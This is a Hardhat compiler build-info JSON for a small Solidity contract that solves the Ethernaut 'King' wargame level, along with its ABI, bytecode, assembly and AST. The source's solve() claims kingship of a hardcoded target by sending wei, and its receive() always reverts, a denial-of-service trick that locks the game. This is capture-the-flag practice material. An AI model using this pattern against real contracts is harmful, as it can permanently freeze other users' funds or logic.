{
	"id": "b01c8bd6a86472186bc584d4ed2cb97b",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernautKing.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n/*contract King {\r\n\r\n  address payable king;\r\n  uint public prize;\r\n  address payable public owner;\r\n\r\n  constructor() public payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value >= prize || msg.sender == owner);\r\n    king.transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address payable) {\r\n    return king;\r\n  }\r\n}*/\r\n\r\n//0x557d634258B353BAC0F7d17d807DAAE74851F638\r\n\r\ncontract ethernautKing {\r\n    constructor () payable {}\r\n\r\n    function solve() external {\r\n        address payable contractAddr = payable(0x557d634258B353BAC0F7d17d807DAAE74851F638);\r\n        contractAddr.transfer(1000000000000001);\r\n    }\r\n\r\n    receive() external payable {\r\n        revert();\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernautKing.sol": {
				"ethernautKing": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "solve",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernautKing.sol\":592:897  contract ethernautKing {\r... */\n  mstore(0x40, 0x80)\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernautKing.sol\":592:897  contract ethernautKing {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"ethernautKing.sol\":878:886  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":592:897  contract ethernautKing {\r... */\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":655:832  function solve() external {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n    tag_8:\n        /* \"ethernautKing.sol\":692:720  address payable contractAddr */\n      0x00\n        /* \"ethernautKing.sol\":731:773  0x557d634258B353BAC0F7d17d807DAAE74851F638 */\n      0x557d634258b353bac0f7d17d807daae74851f638\n        /* \"ethernautKing.sol\":692:774  address payable contractAddr = payable(0x557d634258B353BAC0F7d17d807DAAE74851F638) */\n      swap1\n      pop\n        /* \"ethernautKing.sol\":785:797  contractAddr */\n      dup1\n        /* \"ethernautKing.sol\":785:806  contractAddr.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernautKing.sol\":785:824  contractAddr.transfer(1000000000000001) */\n      0x08fc\n        /* \"ethernautKing.sol\":807:823  1000000000000001 */\n      0x038d7ea4c68001\n        /* \"ethernautKing.sol\":785:824  contractAddr.transfer(1000000000000001) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n        /* \"ethernautKing.sol\":681:832  {\r... */\n      pop\n        /* \"ethernautKing.sol\":655:832  function solve() external {\r... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122073bfb41e7f355436d84b05cad28f6e01d871840e0a1b7e3f32bc7c8bc8219b0d64736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_5": {
									"entryPoint": null,
									"id": 5,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405260e0806100126000396000f3fe608060405260043610601f5760003560e01c8063890d690814602d576028565b36602857600080fd5b600080fd5b348015603857600080fd5b50603f6041565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff166108fc66038d7ea4c680019081150290604051600060405180830381858888f1935050505015801560a6573d6000803e3d6000fd5b505056fea264697066735822122073bfb41e7f355436d84b05cad28f6e01d871840e0a1b7e3f32bc7c8bc8219b0d64736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0xE0 DUP1 PUSH2 0x12 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH1 0x2D JUMPI PUSH1 0x28 JUMP JUMPDEST CALLDATASIZE PUSH1 0x28 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x38 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3F PUSH1 0x41 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH7 0x38D7EA4C68001 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH1 0xA6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0xBFB41E7F355436D84B05CAD28F6E01D871840E0A SHL PUSH31 0x3F32BC7C8BC8219B0D64736F6C634300080700330000000000000000000000 ",
							"sourceMap": "592:305:0:-:0;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_29": {
									"entryPoint": null,
									"id": 29,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@solve_22": {
									"entryPoint": 65,
									"id": 22,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610601f5760003560e01c8063890d690814602d576028565b36602857600080fd5b600080fd5b348015603857600080fd5b50603f6041565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff166108fc66038d7ea4c680019081150290604051600060405180830381858888f1935050505015801560a6573d6000803e3d6000fd5b505056fea264697066735822122073bfb41e7f355436d84b05cad28f6e01d871840e0a1b7e3f32bc7c8bc8219b0d64736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH1 0x2D JUMPI PUSH1 0x28 JUMP JUMPDEST CALLDATASIZE PUSH1 0x28 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x38 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3F PUSH1 0x41 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH7 0x38D7EA4C68001 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH1 0xA6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0xBFB41E7F355436D84B05CAD28F6E01D871840E0A SHL PUSH31 0x3F32BC7C8BC8219B0D64736F6C634300080700330000000000000000000000 ",
							"sourceMap": "592:305:0:-:0;;;;;;;;;;;;;;;;;;;;;;;878:8;;;592:305;;;;655:177;;;;;;;;;;;;;:::i;:::-;;;692:28;731:42;692:82;;785:12;:21;;:39;807:16;785:39;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;681:151;655:177::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "44800",
								"executionCost": "69",
								"totalCost": "44869"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 592,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 897,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122073bfb41e7f355436d84b05cad28f6e01d871840e0a1b7e3f32bc7c8bc8219b0d64736f6c63430008070033",
									".code": [
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 878,
											"end": 886,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 878,
											"end": 886,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 878,
											"end": 886,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 897,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 692,
											"end": 720,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 731,
											"end": 773,
											"name": "PUSH",
											"source": 0,
											"value": "557D634258B353BAC0F7D17D807DAAE74851F638"
										},
										{
											"begin": 692,
											"end": 774,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 692,
											"end": 774,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 797,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 785,
											"end": 806,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 807,
											"end": 823,
											"name": "PUSH",
											"source": 0,
											"value": "38D7EA4C68001"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 785,
											"end": 824,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 785,
											"end": 824,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 681,
											"end": 832,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 832,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"solve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernautKing.sol\":\"ethernautKing\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernautKing.sol\":{\"keccak256\":\"0x7aa24d5ded6aaf238cd6d7609fbb0e557734ed0dd337b7aa5c50ed2c4f0e9998\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f98b76f9c3d600b0e6557034aea266b21b8898d2756925a032540f1457159ec5\",\"dweb:/ipfs/QmQZXjGaomxNCHRY5XeK8eqyjxzNuRwcxCtRbqdX5ezAAx\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"ethernautKing.sol": {
				"ast": {
					"absolutePath": "ethernautKing.sol",
					"exportedSymbols": {
						"ethernautKing": [
							30
						]
					},
					"id": 31,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 30,
							"linearizedBaseContracts": [
								30
							],
							"name": "ethernautKing",
							"nameLocation": "601:13:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 4,
										"nodeType": "Block",
										"src": "645:2:0",
										"statements": []
									},
									"id": 5,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "634:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "645:0:0"
									},
									"scope": 30,
									"src": "622:25:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "681:151:0",
										"statements": [
											{
												"assignments": [
													9
												],
												"declarations": [
													{
														"constant": false,
														"id": 9,
														"mutability": "mutable",
														"name": "contractAddr",
														"nameLocation": "708:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 21,
														"src": "692:28:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 8,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "692:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 14,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "307835353764363334323538423335334241433046376431376438303744414145373438353146363338",
															"id": 12,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "731:42:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"value": "0x557d634258B353BAC0F7d17d807DAAE74851F638"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 11,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "723:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 10,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "723:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "723:51:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "692:82:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "31303030303030303030303030303031",
															"id": 18,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "807:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1000000000000001_by_1",
																"typeString": "int_const 1000000000000001"
															},
															"value": "1000000000000001"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_rational_1000000000000001_by_1",
																"typeString": "int_const 1000000000000001"
															}
														],
														"expression": {
															"id": 15,
															"name": "contractAddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "785:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 17,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "785:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 19,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "785:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 20,
												"nodeType": "ExpressionStatement",
												"src": "785:39:0"
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 22,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "664:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "669:2:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "681:0:0"
									},
									"scope": 30,
									"src": "655:177:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "867:27:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 25,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "878:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 26,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "878:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 27,
												"nodeType": "ExpressionStatement",
												"src": "878:8:0"
											}
										]
									},
									"id": 29,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "847:2:0"
									},
									"returnParameters": {
										"id": 24,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "867:0:0"
									},
									"scope": 30,
									"src": "840:54:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 31,
							"src": "592:305:0",
							"usedErrors": []
						}
					],
					"src": "33:866:0"
				},
				"id": 0
			}
		}
	}
}